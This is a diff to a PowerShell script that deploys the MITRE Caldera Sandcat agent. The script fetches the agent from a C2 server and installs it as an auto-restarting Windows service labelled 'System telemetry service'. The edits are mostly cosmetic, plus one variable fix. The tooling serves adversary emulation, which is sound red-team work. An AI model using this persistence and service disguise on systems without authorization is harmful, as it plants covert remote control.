@@ -74,9 +74,9 @@ param(
     [string]$Proxy = ""
 )
 
-# ──────────────────────────────────────────────────────────────
+# --------------------------------------------------------------
 # Helper: Write colored status messages
-# ──────────────────────────────────────────────────────────────
+# --------------------------------------------------------------
 function Write-Status {
     param([string]$Message, [string]$Level = "INFO")
     $colors = @{ INFO = "Cyan"; OK = "Green"; WARN = "Yellow"; ERROR = "Red" }
@@ -85,9 +85,9 @@ function Write-Status {
     Write-Host "[$ts] [$Level] $Message" -ForegroundColor $color
 }
 
-# ──────────────────────────────────────────────────────────────
+# --------------------------------------------------------------
 # Helper: Download agent binary from Caldera server
-# ──────────────────────────────────────────────────────────────
+# --------------------------------------------------------------
 function Get-SandcatBinary {
     param([string]$Server, [string]$Destination)
 
@@ -133,9 +133,9 @@ function Get-SandcatBinary {
     }
 }
 
-# ──────────────────────────────────────────────────────────────
+# --------------------------------------------------------------
 # Helper: Run agent as a one-time foreground/background process
-# ──────────────────────────────────────────────────────────────
+# --------------------------------------------------------------
 function Start-SandcatProcess {
     param(
         [string]$AgentBin,
@@ -180,10 +180,10 @@ function Start-SandcatProcess {
     }
 }
 
-# ──────────────────────────────────────────────────────────────
+# --------------------------------------------------------------
 # Helper: Install agent as a persistent Windows service
 #         Uses NSSM if available, otherwise sc.exe wrapper
-# ──────────────────────────────────────────────────────────────
+# --------------------------------------------------------------
 function Install-SandcatService {
     param(
         [string]$Name,
@@ -196,10 +196,10 @@ function Install-SandcatService {
     $agentArgs = "-server $Server -group $Group"
     if ($C2 -ne "http") { $agentArgs += " -contact $C2" }
 
-    # ── Option A: Use NSSM (recommended) ──────────────────────
+    # -- Option A: Use NSSM (recommended) ----------------------
     $nssm = Get-Command "nssm.exe" -ErrorAction SilentlyContinue
     if ($nssm) {
-        Write-Status "NSSM found – installing service via NSSM"
+        Write-Status "NSSM found - installing service via NSSM"
         & nssm install $Name $AgentBin $agentArgs
         & nssm set    $Name Start SERVICE_AUTO_START
         & nssm set    $Name AppRestartDelay 5000
@@ -208,22 +208,22 @@ function Install-SandcatService {
         return
     }
 
-    # ── Option B: sc.exe + a wrapper batch file ───────────────
-    Write-Status "NSSM not found – using sc.exe with a wrapper batch" -Level "WARN"
+    # -- Option B: sc.exe + a wrapper batch file ---------------
+    Write-Status "NSSM not found - using sc.exe with a wrapper batch" -Level "WARN"
 
     $wrapperPath = [System.IO.Path]::ChangeExtension($AgentBin, ".bat")
-    $wrapperContent = @"
-@echo off
-:loop
-"$AgentBin" $agentArgs
-timeout /t 10 /nobreak >nul
-goto loop
-"@
+    $wrapperContent = (
+        '@echo off' + "`r`n" +
+        ':loop' + "`r`n" +
+        "`"$AgentBin`" $agentArgs" + "`r`n" +
+        'timeout /t 10 /nobreak >nul' + "`r`n" +
+        'goto loop'
+    )
     Set-Content -Path $wrapperPath -Value $wrapperContent -Encoding ASCII
 
     # Windows services cannot directly run .exe without a service host;
     # use cmd.exe as the service binary and pass the wrapper as argument.
-    $binPath = "cmd.exe /c `"$wrapperPath`""
+    $binPath = ('cmd.exe /c "' + $wrapperPath + '"')
 
     sc.exe create $Name binPath= $binPath start= auto DisplayName= $Name | Out-Null
     sc.exe description $Name "System telemetry service" | Out-Null
@@ -233,13 +233,13 @@ goto loop
     if ($svc) {
         Write-Status "Service '$Name' installed and started via sc.exe" -Level "OK"
     } else {
-        Write-Status "Service installation may have failed – check sc.exe output" -Level "WARN"
+        Write-Status "Service installation may have failed - check sc.exe output" -Level "WARN"
     }
 }
 
-# ──────────────────────────────────────────────────────────────
+# --------------------------------------------------------------
 # Helper: Remove an existing service before reinstalling
-# ──────────────────────────────────────────────────────────────
+# --------------------------------------------------------------
 function Remove-ExistingService {
     param([string]$Name)
     $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
@@ -251,17 +251,17 @@ function Remove-ExistingService {
     }
 }
 
-# ══════════════════════════════════════════════════════════════
+# ==============================================================
 #  MAIN
-# ══════════════════════════════════════════════════════════════
+# ==============================================================
 
-Write-Status "═══════════════════════════════════════════════"
-Write-Status " MITRE Caldera – Sandcat Agent Deployer"
+Write-Status "==============================================="
+Write-Status " MITRE Caldera - Sandcat Agent Deployer"
 Write-Status " Target server : $CalderaServer"
 Write-Status " Group         : $Group"
 Write-Status " C2 channel    : $C2Channel"
 Write-Status " Agent path    : $AgentPath"
-Write-Status "═══════════════════════════════════════════════"
+Write-Status "==============================================="
 
 # 1. Confirm the Caldera server is reachable
 Write-Status "Checking connectivity to Caldera server..."
@@ -277,11 +277,11 @@ catch {
 
 # 2. Download the binary (skip if already present and user is just re-running)
 if (Test-Path $AgentPath) {
-    Write-Status "Agent binary already exists at '$AgentPath' – skipping download" -Level "WARN"
+    Write-Status "Agent binary already exists at '$AgentPath' - skipping download" -Level "WARN"
 } else {
     $downloaded = Get-SandcatBinary -Server $CalderaServer -Destination $AgentPath
     if (-not $downloaded) {
-        Write-Status "Aborting – could not obtain agent binary." -Level "ERROR"
+        Write-Status "Aborting - could not obtain agent binary." -Level "ERROR"
         exit 1
     }
 }
@@ -293,7 +293,7 @@ Unblock-File -Path $AgentPath -ErrorAction SilentlyContinue
 if ($InstallAsService) {
     Remove-ExistingService -Name $ServiceName
     Install-SandcatService -Name $ServiceName `
-        -AgentBin $AgentBin `
+        -AgentBin $AgentPath `
         -Server   $CalderaServer `
         -Group    $Group `
         -C2       $C2Channel
